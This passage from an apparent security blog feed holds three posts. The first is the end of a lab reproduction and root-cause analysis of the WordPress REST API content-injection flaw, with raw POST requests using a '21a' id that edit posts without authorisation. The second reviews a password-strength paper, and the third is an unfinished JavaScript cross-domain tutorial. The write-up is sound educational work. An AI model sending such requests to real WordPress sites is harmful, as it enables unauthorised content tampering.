<p>并且搜索找到以下代码段：<br><img src="http://dassec.b0.upaiyun.com/zhgchg/WP-content-Injection/5.png" alt=""><br>　　将其中的：<code>AllowOverride None</code>改为<code>AllowOverride All</code>。<br>重启服务即可。</p>
<p><strong>设置WordPress站点为固定链接：</strong></p>
<p><img src="http://dassec.b0.upaiyun.com/zhgchg/WP-content-Injection/6.png" alt=""></p>
<p>　　选择非朴素类即可。</p>
<p>　　准备工作完成。</p>
<h2 id="0x03-漏洞复现过程"><a href="#0x03-漏洞复现过程" class="headerlink" title="0x03 漏洞复现过程"></a>0x03 漏洞复现过程</h2><p>API地址：<code>http://127.0.0.1/wordpress/wp-json</code><br><img src="http://dassec.b0.upaiyun.com/zhgchg/WP-content-Injection/7.png" alt=""></p>
<p>json编码的网页内容</p>
<p>查看文章列表：<code>http://127.0.0.1/wordpress/wp-json/wp/v2/posts</code><br><img src="http://dassec.b0.upaiyun.com/zhgchg/WP-content-Injection/8.png" alt=""></p>
<p>根据文章列表找到每篇文章对应的ID。</p>
<p>检索文章：<code>http://127.0.0.1/wordpress/wp-json/wp/v2/posts/21</code><br><img src="http://dassec.b0.upaiyun.com/zhgchg/WP-content-Injection/9.png" alt=""></p>
<p>修改文章：</p>
<pre><code>POST /wordpress/wp-json/wp/v2/posts/21?id=21 HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0
Content-Type: application/json
Content-Length: 0
{&quot;title&quot;:&quot;x x x x&quot;}
</code></pre><p><img src="http://dassec.b0.upaiyun.com/zhgchg/WP-content-Injection/10.png" alt=""></p>
<p>构造以下数据包：</p>
<pre><code>POST /wordpress/wp-json/wp/v2/posts/21?id=21a HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0
Content-Type: application/json
Content-Length: 0
{&quot;title&quot;:&quot;x x x x&quot;}
</code></pre><p><img src="http://dassec.b0.upaiyun.com/zhgchg/WP-content-Injection/11.png" alt=""></p>
<p>返回200，修改成功。</p>
<h2 id="0x03-浅析漏洞产生原因"><a href="#0x03-浅析漏洞产生原因" class="headerlink" title="0x03 浅析漏洞产生原因"></a>0x03 浅析漏洞产生原因</h2><p>HTTP客户端可以对资源执行的操作类型：HEAD、GET、POST、PUT、DELETE</p>
<p>检索文章：<code>http://127.0.0.1/wordpress/wp-json/wp/v2/posts/21</code><br><img src="http://dassec.b0.upaiyun.com/zhgchg/WP-content-Injection/12.png" alt=""></p>
<p>　　● 路由（route）是wp/v2/posts/21，不包括wp-json，因为wp-json是API本身的基本路径。</p>
<p>在文件./wp-includes/rest-api/endpoints/class-wp-rest-post-controller.php中<br><img src="http://dassec.b0.upaiyun.com/zhgchg/WP-content-Injection/13.png" alt=""></p>
<p>　　注册的路由用来数字填充id请求参数，比如上面这个wp-json/wp/v2/posts/21，就是将id参数设置为21。并且其中对路由进行了正则限制，防止攻击者恶意构造id值。但是查看rest-api管理访问的时候，又发现$_GET和$_POST的值的优先级高于路由的正则表达式。这样的话，攻击者就可以发送wp-json/wp/v2/posts/21a的请求，rest-api也就会把21a分配为id参数，这样id值中就不仅仅包涵数字了。</p>
<p>继续发现update_item_permissions_check()<br><img src="http://dassec.b0.upaiyun.com/zhgchg/WP-content-Injection/14.png" alt=""></p>
<p>　　它将字母数字ID直接传送给了get_post函数，这个函数通过检查帖子是否实际存在以及用户是否有权编辑此帖来验证请求。如果我们发送一个没有相应帖子的ID，我们可以通过权限检查，并被允许继续执行对update_item方法的请求。</p>
<p>这样的id参数需要满足两个条件：</p>
<ul>
<li>1、使得get_post()函数找不到对应的文章</li>
<li>2、使得update_item ()函数能找到对应的文章</li>
</ul>
<p>又发现使用wp-posts中的get-instance（）静态方法来抓取帖子，<br><img src="http://dassec.b0.upaiyun.com/zhgchg/WP-content-Injection/15.png" alt=""></p>
<p>　　可以看出，对于不是由纯数字组成的任何输入，其基本上会失败 。<br>这意味着WordPress（将其视作具有足够权限编辑此帖的用户）会运行update_item方法。<br>而update_item方法的作用是：WordPress在向get-post传参之前会将ID参数转换为一个整数。又因为PHP进行类型转换的方式，进而导致了将21a转换成21。</p>
<p><strong>漏洞产生的逻辑过程</strong></p>
<p><img src="http://dassec.b0.upaiyun.com/zhgchg/WP-content-Injection/17.png" alt=""></p>
<p>参考链接：<br><a href="http://www.freebuf.com/vuls/126734.html" target="_blank" rel="external">新曝WordPress REST API内容注入漏洞详解</a>　<a href="https://www.seebug.org/vuldb/ssvid-92637" target="_blank" rel="external">WordPress REST API 内容注入漏洞</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;!-- 这里是文章头部的图片 大小为800px*200px左右--&gt;
&lt;p&gt;&lt;img src=&quot;http://dassec.b0.upaiyun.com/zhgchg/WP-content-Injection/header.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;!-- 这里是简单的介绍，50-100字 --&gt;&lt;br&gt;　　&lt;br&gt;WordPress REST API内容注入漏洞是由于权限控制失效导致内容注入或修改。该漏洞可以导致WordPress所有文章内容可以未经验证被查看，修改，删除，甚至创建新的文章，危害巨大。&lt;/p&gt;
    
    </summary>
    
      <category term="安全笔记" scheme="http://das.scusec.org/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="zhgchg智齿" scheme="http://das.scusec.org/tags/zhgchg%E6%99%BA%E9%BD%BF/"/>
    
  </entry>
  
  <entry>
    <title>【文献阅读】A Canonical Password Strength Measure</title>
    <link href="http://das.scusec.org/2017/02/11/%E3%80%90%E6%96%87%E7%8C%AE%E9%98%85%E8%AF%BB%E3%80%91A%20Canonical%20Password%20Strength%20Measure/"/>
    <id>http://das.scusec.org/2017/02/11/【文献阅读】A Canonical Password Strength Measure/</id>
    <published>2017-02-11T01:51:39.000Z</published>
    <updated>2017-02-17T09:20:09.109Z</updated>
    
    <content type="html"><![CDATA[<!-- 这里是文章头部的图片 大小为800px*200px左右-->
<p><img src="http://dassec.b0.upaiyun.com/chuancy/password.png" alt=""><br><!-- 这里是简单的介绍，50-100字 --></p>
<p>最近看了一篇关于密码安全的文章：A Canonical Password Strength Measure. 论文作者：Eugene Panferov</p>
<p>我大体梳理了下：<br><a id="more"></a></p>
<h4 id="论文主要思路"><a href="#论文主要思路" class="headerlink" title="论文主要思路"></a>论文主要思路</h4><p>该论文主要是介绍一种典型的密码强度度测方法。其中，论文分别从攻击者的猜测攻击策略和防御者的防御策略入手分析，给出了一个基于密码序列猜测攻击的有效性评估的密码强度的定义，并给出计算方法。</p>
<h4 id="论文结构"><a href="#论文结构" class="headerlink" title="论文结构"></a>论文结构</h4><ul>
<li><p>摘要</p>
<p>作者介绍了论文研究方向，提出密码安全研究领域中缺乏对密码强度这个基本的概念的正确定义。并提出论文对密码强度定义与度测的研究情况。</p>
</li>
<li><p>简介</p>
<p> 提出关于密码强度相关的两个问题：什么是密码强调？什么是猜测攻击？然后给出一个观点：密码强度不是密码的特征，而是攻击的特征。提出从攻击者与防御者两个方面的策略考虑的密码强度的度测思路。</p>
</li>
<li><p>当前研究现状</p>
<p>尽管安全问题的重要性随着电子通信技术的发展而日趋提高，密码安全也有很多文献描述。但是大都没有实际的分析证明或者直接论据来论证密码强度。到论文发表为止，现有的文献并没有提供一个满意的回答如何精确(准确)度量一个给定的密码序列集的密码强度这一问题的答案，有一个流行的网站给出了一个空而华丽的非正式的定义：密码强度是一个密码抵抗猜测攻击和爆破攻击的有效性的度量，在任何形式下，它是评估一个攻击者在不知道密码的情况下，正确猜中密码的尝试次数的一个平均值，一个的密码强度是密码长度，复杂性，不可预测性的函数。显然这个问题的关键是：什么是“有效性”，“抵抗攻击能力”，“复杂性”以及“不可预测行”。</p>
<p>然而密码强度的定义的缺失并不会妨碍一些网络互联网公司在用户创建密码时，提供密码强度度量的服务。如：google给定的创建密码必须遵循的规则。</p>
<p>另外的一个例子是很多在线的密码轻度度量计，它们对于同一个密码，给出的强度也有时相互冲突。这就缺乏密码强度定义的结果。</p>
<p>与公司和大众想法不同的是，一些论文开始经验主义的去试图分析密码的弱点。这些论文一致同意广泛认为的“最佳实践”在密码安全的研究上具有很小的意义。</p>
<p>尽管香农信息熵理论被普遍运用到密码强度的研究和一些流行的网站密码服务中，但是仍没有一个明确的密码强度的定义。</p>
</li>
<li><p>问题的研究过程</p>
<p>论文从攻击模型的建立，到给出密码强度的度测方法，再到攻击者角度和防御者角度分析了密码强度与攻击策略有关。最后得出结论</p>
</li>
<li><p>结论</p>
<p>提出密码强度不是密码的特征，而是攻击的特征。给出了基于攻击字典序列的密码的计算方法。密码强度是与攻击字典序列顺序有关，当攻击者攻击字典序列顺序确定时，即攻击策略确定时，密码强度才能计算。</p>
</li>
</ul>
<h4 id="自己观点"><a href="#自己观点" class="headerlink" title="自己观点"></a>自己观点</h4><p>作者从攻击者的角度利用香农信息理论去建立猜测攻击模型，从攻击字典序列顺序入手定义攻击长度这个概念。之后利用攻击长度来代表攻击者攻击一个密码的代价。从而推导出当攻击序列顺序确定时一个密码的强度。作者只从单纯的信息理论角度入手评估一个给定密码在确定攻击序列顺序的情况下的密码强度，并没有考虑在多种攻击策略的情况下的密码强度的评估。这里的多种攻击策略包括目前已知的如：键盘序列，用户自己的私人信息以及网络常用语等等策略。</p>
<p>本人以为要想确定一个给定密码的密码强度，还需要考虑该密码是对于谁。不同的用户，对于同一个密码，密码强度也应该有所不同，毕竟还要考虑用户个人信息对密码的攻击策略制定的影响。所以，密码强度定义还应考虑更灵活与全面一些。</p>
<h4 id="精彩句子"><a href="#精彩句子" class="headerlink" title="精彩句子"></a>精彩句子</h4><ol>
<li>we demonstrate that “password strength” (in any practical sense) is a function of an attack;</li>
<li>We offer to the reader a non-orthodox perspective: the password’s strength is NOT a characteristic of a password,<br>but a characteristic of an attack.</li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;!-- 这里是文章头部的图片 大小为800px*200px左右--&gt;
&lt;p&gt;&lt;img src=&quot;http://dassec.b0.upaiyun.com/chuancy/password.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;!-- 这里是简单的介绍，50-100字 --&gt;&lt;/p&gt;
&lt;p&gt;最近看了一篇关于密码安全的文章：A Canonical Password Strength Measure. 论文作者：Eugene Panferov&lt;/p&gt;
&lt;p&gt;我大体梳理了下：&lt;br&gt;
    
    </summary>
    
      <category term="文献阅读" scheme="http://das.scusec.org/categories/%E6%96%87%E7%8C%AE%E9%98%85%E8%AF%BB/"/>
    
    
      <category term="Cryptography and Security" scheme="http://das.scusec.org/tags/Cryptography-and-Security/"/>
    
      <category term="scc" scheme="http://das.scusec.org/tags/scc/"/>
    
  </entry>
  
  <entry>
    <title>跨域方法总结</title>
    <link href="http://das.scusec.org/2016/10/17/summary-of-cross-domain/"/>
    <id>http://das.scusec.org/2016/10/17/summary-of-cross-domain/</id>
    <published>2016-10-16T16:00:00.000Z</published>
    <updated>2017-03-22T02:17:52.933Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://dassec.b0.upaiyun.com/wps2015/scorm-cross-domian.png" alt=""><br>最近面试问的挺多的一个问题，就是JavaScript的跨域问题。在这里，对跨域的一些方法做个总结。由于浏览器的同源策略，不同域名、不同端口、不同协议都会构成跨域；但在实际的业务中，很多场景需要进行跨域传递信息，这样就催生出多种跨域方法。<br><a id="more"></a></p>
<h3 id="1-具备src的标签"><a href="#1-具备src的标签" class="headerlink" title="1. 具备src的标签"></a>1. 具备src的标签</h3><ul>
<li>原理：所有具有<code>src</code>属性的HTML标签都是可以跨域的</li>
</ul>
<p>在浏览器中，<code>&lt;script&gt;</code>、<code>&lt;img&gt;</code>、<code>&lt;iframe&gt;</code>和<code>&lt;link&gt;</code>这几个标签是可以加载跨域（非同源）的资源的，并且加载的方式其实相当于一次普通的GET请求，唯一不同的是，为了安全起见，浏览器不允许这种方式下对加载到的资源的读写操作，而只能使用标签本身应当具备的能力（比如脚本执行、样式应用等等）。</p>
<h3 id="2-JSONP跨域"><a href="#2-JSONP跨域" class="headerlink" title="2. JSONP跨域"></a>2. JSONP跨域</h3><ul>
<li>原理：<code>&lt;script&gt;</code>是可以跨域的，而且在跨域脚本中可以直接回调当前脚本的函数</li>
</ul>
<p>script标签是可以加载异域的JavaScript并执行的，通过预先设定好的callback函数来实现和母页面的交互。它有一个大名，叫做JSONP跨域，JSONP是JSON with Padding的略称。它是一个非官方的协议，明明是加载script，为啥和JSON扯上关系呢？原来就是这个callback函数，对它的使用有一个典型的方式，就是通过JSON来传参，即将JSON数据填充进回调函数，这就是JSONP的JSON+Padding的含义。JSONP只支持GET请求。<br>前端代码：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">"text/javascript"</span>&gt;</span><span class="actionscript"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">dosomething</span><span class="params">(jsondata)</span></span>&#123;</span><br><span class="line">        <span class="comment">//处理获得的json数据</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">src</span>=<span class="value">"http://haorooms.com/data.php?callback=dosomething"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>后台代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="variable">$callback</span> = <span class="variable">$_GET</span>[<span class="string">'callback'</span>];<span class="comment">//得到回调函数名</span></span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">array</span>(<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>);<span class="comment">//要返回的数据</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$callback</span>.<span class="string">'('</span>.json_encode(<span class="variable">$data</span>).<span class="string">')'</span>;<span class="comment">//输出</span></span><br><span class="line"><span class="preprocessor">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<h3 id="3-跨域资源共享（CORS）"><a href="#3-跨域资源共享（CORS）" class="headerlink" title="3. 跨域资源共享（CORS）"></a>3. 跨域资源共享（CORS）</h3><ul>
<li>原理：服务器设置Access-Control-Allow-Origin HTTP响应头之后，浏览器将会允许跨域请求</li>
</ul>
<p>CORS是HTML5标准提出的跨域资源共享(Cross Origin Resource Share)，支持GET、POST等所有HTTP请求。CORS需要服务器端设置<code>Access-Control-Allow-Origin</code>头，否则浏览器会因为安全策略拦截返回的信息。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: *              # 允许所有域名访问，或者</span><br><span class="line">Access-Control-Allow-Origin: http://a.com   # 只允许所有域名访问</span><br></pre></td></tr></table></figure></p>
<p>CORS又分为简单跨域和非简单跨域请求，有关CORS的详细介绍请看<code>阮一峰</code>的<a href="http://www.ruanyifeng.com/blog/2016/04/cors.html" target="_blank" rel="external">跨域资源共享 CORS 详解</a>，里面讲解的非常详细。</p>
<h3 id="4-document-domain"><a href="#4-document-domain" class="headerlink" title="4. document.domain"></a>4. document.domain</h3><ul>
<li>原理：相同主域名不同子域名下的页面，可以设置document.domain让它们同域</li>
</ul>
<p>我们只需要在跨域的两个页面中设置document.domain就可以了。修改document.domain的方法只适用于不同子域的框架间的交互，要载入iframe页面。<br>例如：1. 在页面 <a href="http://a.example.com/a.html" target="_blank" rel="external">http://a.example.com/a.html</a> 设置document.domain<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">iframe</span> <span class="attribute">id</span> = "<span class="attribute">iframe</span>" <span class="attribute">src</span>=<span class="value">"http://b.example.com/b.html"</span> <span class="attribute">onload</span> = "<span class="attribute">test</span>()"&gt;</span><span class="tag">&lt;/<span class="title">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">"text/javascript"</span>&gt;</span><span class="javascript"></span><br><span class="line">    <span class="built_in">document</span>.domain = <span class="string">'example.com'</span>;<span class="comment">//设置成主域</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        alert(<span class="built_in">document</span>.getElementById(<span class="string">'￼iframe'</span>).contentWindow);<span class="comment">//contentWindow 可取得子窗口的 window 对象</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>2、在页面http:// b.example.com/b.html 中设置document.domain<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">"text/javascript"</span>&gt;</span><span class="javascript"></span><br><span class="line">    <span class="built_in">document</span>.domain = <span class="string">'example.com'</span>;<span class="comment">//在iframe载入这个页面也设置document.domain，使之与主页面的document.domain相同</span></span><br><span class="line"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h3 id="5-window-name"><a href="#5-window-name" class="headerlink" title="5. window.name"></a>5. window.name</h3><ul>
<li>原理：window对象有个name属性，该属性有个特征：即在一个窗口(window)的生命周期内,窗口载入的所有的页面都是共享一个window.name的，每个页面对window.name都有读写的权限，window.name是持久存在一个窗口载入过的所有页面中的。</li>
</ul>
<p>这里有三个页面：</p>
<ul>
<li>sever.com/a.html  数据存放页面</li>
<li>agent.com/b.html  数据获取页面</li>
<li>agent.com/c.html  空页面，做代理使用</li>
</ul>
<p>a.html中，设定<code>window.name</code>作为需要传递的值<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"></span><br><span class="line">    <span class="built_in">window</span>.name = <span class="string">'I was there!'</span>;</span><br><span class="line">    alert(<span class="built_in">window</span>.name);</span><br><span class="line"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>b.html中，当iframe加载后将iframe的<code>src</code>指向同域的<code>c.html</code>，这样就可以利用<code>iframe.contentWindow.name</code>获取要传递的值了<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">"text/javascript"</span>&gt;</span><span class="javascript"></span><br><span class="line">  iframe = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span><br><span class="line">  iframe.style.display = <span class="string">'none'</span>;</span><br><span class="line">  <span class="keyword">var</span> state = <span class="number">0</span>;</span><br><span class="line">  iframe.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(state === <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">var</span> data = <span class="built_in">JSON</span>.parse(iframe.contentWindow.name);</span><br><span class="line">      alert(data);</span><br><span class="line">      iframe.contentWindow.document.write(<span class="string">''</span>);</span><br><span class="line">      iframe.contentWindow.close();</span><br><span class="line">      <span class="built_in">document</span>.body.removeChild(iframe);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(state === <span class="number">0</span>) &#123;</span><br><span class="line">      state = <span class="number">1</span>;</span><br><span class="line">      iframe.contentWindow.location = <span class="string">'http://agent.com/c.html'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  iframe.src = <span class="string">'http://sever.com/a.html'</span>;</span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(iframe);</span><br><span class="line">  </span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">body</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>成功获取跨域数据，效果如下：<br><img src="https://img.alicdn.com/imgextra/i3/792076116/TB2HXEBXk1M.eBjSZFOXXc0rFXa_!!792076116.png" alt=""></p>
<h3 id="6-window-postMesage"><a href="#6-window-postMesage" class="headerlink" title="6. window.postMesage"></a>6. window.postMesage</h3><ul>
<li>原理: HTML5新增的postMessage方法，通过postMessage来传递信息，对方可以通过监听message事件来监听信息。可跨主域名及双向跨域。</li>
</ul>
<p>这里有两个页面：</p>
<ol>
<li>agent.com/index.html</li>
<li>server.com/remote.html</li>
</ol>
<p>本地代码index.html<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">body</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="title">iframe</span> <span class="attribute">id</span>=<span class="value">"proxy"</span> <span class="attribute">src</span>=<span class="value">"http://server.com/remote.html"</span> <span class="attribute">onload</span> = "<span class="attribute">postMsg</span>()" <span class="attribute">style</span>=<span class="value">"display: none"</span> &gt;</span><span class="tag">&lt;/<span class="title">iframe</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">"text/javascript"</span>&gt;</span><span class="javascript">  </span><br><span class="line">        <span class="keyword">var</span> obj = &#123;  </span><br><span class="line">            msg: <span class="string">'hello world'</span>  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">postMsg</span> (<span class="params"></span>)</span>&#123;  </span><br><span class="line">            <span class="keyword">var</span> iframe = <span class="built_in">document</span>.getElementById(<span class="string">'proxy'</span>);  </span><br><span class="line">            <span class="keyword">var</span> win = iframe.contentWindow;  </span><br><span class="line">            win.postMessage(obj,<span class="string">'http://server.com'</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">    </span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="title">body</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><code>postMessage</code>的使用方法： otherWindow.postMessage(message, targetOrigin);</p>
<ul>
<li>otherWindow: 指目标窗口，也就是给哪个window发消息，是 window.frames 属性的成员或者由 window.open 方法创建的窗口</li>
<li>message:   是要发送的消息，类型为 String、Object (IE8、9 不支持)</li>
<li>targetOrigin:   是限定消息接收范围，不限制请使用 ‘*’</li>
</ul>
<p>server.com上remote.html，监听<code>message</code>事件，并检查来源是否是要通信的域。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;head&#62;&#10;    &#60;title&#62;&#60;/title&#62;&#10;    &#60;script type=&#34;text/javascript&#34;&#62;&#10;        window.onmessage = function(e)&#123;&#10;            if(e.origin !== &#39;http://localhost:8088&#39;) return;&#10;            alert(e.data.msg+&#34; from &#34;+e.origin);&#10;        &#125;&#10;    &#60;/script&#62;&#10;&#60;/head&#62;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://img.alicdn.com/imgextra/i3/792076116/TB2nrneXCmK.eBjSZPfXXce2pXa_!!792076116.png" alt=""></p>
<h3 id="7-location-hash"><a href="#7-location-hash" class="headerlink" title="7. location.hash"></a>7. location.hash</h3><p>原理：</p>
<ul>
<li>这个办法比较绕，但是可以解决完全跨域情况下的脚步置换问题。原理是利用location.hash来进行传值。www.a.com下的a.html想和www.b.com下的b.html通信（在a.html中动态创建一个b.html的iframe来发送请求）</li>
<li>但是由于“同源策略”的限制他们无法进行交流（b.html无法返回数据），于是就找个中间人：www.a.com下的c.html（注意是www.a.com下的）。</li>
<li>b.html将数据传给c.html（b.html中创建c.html的iframe），由于c.html和a.html同源，于是可通过c.html将返回的数据传回给a.html，从而达到跨域的效果。</li>
</ul>
<p><img src="https://img.alicdn.com/imgextra/i4/792076116/TB23US2XM1J.eBjy0FaXXaXeVXa_!!792076116.jpg" alt=""><br>a.html代码如下：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">startRequest</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">    <span class="keyword">var</span> ifr = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);  </span><br><span class="line">    ifr.style.display = <span class="string">'none'</span>;  </span><br><span class="line">    ifr.src = <span class="string">'http://www.b.com/b.html#sayHi'</span>; <span class="comment">//传递的location.hash </span></span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(ifr);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkHash</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line">    <span class="keyword">try</span> &#123;  </span><br><span class="line">        <span class="keyword">var</span> data = location.hash ? location.hash.substring(<span class="number">1</span>) : <span class="string">''</span>;  </span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">console</span>.log) &#123;  </span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'Now the data is '</span>+data);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125; <span class="keyword">catch</span>(e) &#123;&#125;;  </span><br><span class="line">&#125;  </span><br><span class="line">setInterval(checkHash, <span class="number">2000</span>); </span><br><span class="line"><span class="built_in">window</span>.onload = startRequest;</span><br><span class="line"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>b.html代码如下：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkHash</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> data = <span class="string">''</span>;</span><br><span class="line">  <span class="comment">//模拟一个简单的参数处理操作</span></span><br><span class="line">  <span class="keyword">switch</span>(location.hash)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'#sayHello'</span>: data = <span class="string">'HelloWorld'</span>;<span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'#sayHi'</span>: data = <span class="string">'HiWorld'</span>;<span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>: <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  data &amp;&amp; callBack(<span class="string">'#'</span>+data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">callBack</span>(<span class="params">hash</span>)</span>&#123;</span><br><span class="line">  <span class="comment">// ie、chrome的安全机制无法修改parent.location.hash，所以要利用一个中间的www.a.com域下的代理iframe</span></span><br><span class="line">  <span class="keyword">var</span> proxy = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span><br><span class="line">  proxy.style.display = <span class="string">'none'</span>;</span><br><span class="line">  proxy.src = <span class="string">'http://localhost:8088/proxy.html'</span>+hash;  <span class="comment">// 注意该文件在"www.a.com"域下</span></span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(proxy);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">window</span>.onload = checkHash;</span><br><span class="line"></span><span class="tag">&lt;/<span 